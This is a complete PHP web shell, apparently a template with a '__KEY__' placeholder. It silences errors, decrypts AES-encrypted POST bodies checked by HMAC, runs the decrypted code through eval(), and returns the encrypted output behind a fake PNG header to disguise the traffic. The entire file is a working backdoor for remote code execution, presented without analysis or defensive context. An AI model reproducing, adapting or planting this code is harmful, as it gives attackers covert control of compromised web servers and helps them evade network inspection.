<?php
@session_start();
@error_reporting(0);
@ini_set('display_errors', '0');

function Decrypt($data) {
    if (!function_exists('openssl_decrypt')) return "";
    

    if (strpos($data, '=') !== false && !preg_match('/^[a-zA-Z0-9\/\+=]+$/', $data)) {
        parse_str($data, $outputArr);
        $data = reset($outputArr); 
    }

    $prefixLen = 68;
    if (strlen($data) <= $prefixLen + 48) return "";
    
    $encrypted = substr($data, $prefixLen);
    $key = "__KEY__";
    $raw = unpack('C*', $key);
    $raw = $raw ? array_values($raw) : [];
    $rawLen = count($raw);
    if ($rawLen === 0) return "";
    
    $aesKey = "";
    for ($i = 0; $i < 16; $i++) {
        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
    }
    
    $iv = substr($encrypted, 0, 16);
    $tag = substr($encrypted, -32);

    $bodyLen = strlen($encrypted) - 16 - 32; 
    $body = substr($encrypted, 16, $bodyLen);
    
    if ($iv === false || $tag === false || $body === false || $bodyLen <= 0) return "";
    
    $macData = $iv . $body;
    $check = hash_hmac('sha256', $macData, $aesKey, true);
    
    if (!hash_equals($check, $tag)) return ""; 
    
    return openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
}

function Encrypt($data) {
    if (!function_exists('openssl_encrypt')) return $data;
    $key = "__KEY__";
    $raw = unpack('C*', $key);
    $raw = $raw ? array_values($raw) : [];
    $rawLen = count($raw);
    if ($rawLen === 0) return $data;
    
    $aesKey = "";
    $ivStr = "";
    for ($i = 0; $i < 16; $i++) {
        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
        $ivStr .= chr($raw[$i % $rawLen] ^ 0x2E);
    }
    
    $enc = openssl_encrypt($data, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $ivStr);
    $macData = $ivStr . $enc;
    $tag = hash_hmac('sha256', $macData, $aesKey, true);
    $prefix = base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=");
    
    return $prefix . $ivStr . $enc . $tag;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $postData = file_get_contents("php://input");
    if (!empty($postData)) {
        $deMsg = Decrypt($postData);
        if (!empty($deMsg)) {
            ob_start();
            try {
                @eval($deMsg);
            } catch (\Throwable $e) {
            }
            $output = ob_get_contents();
            ob_end_clean();
            echo Encrypt($output);
        }
    }
}
?>
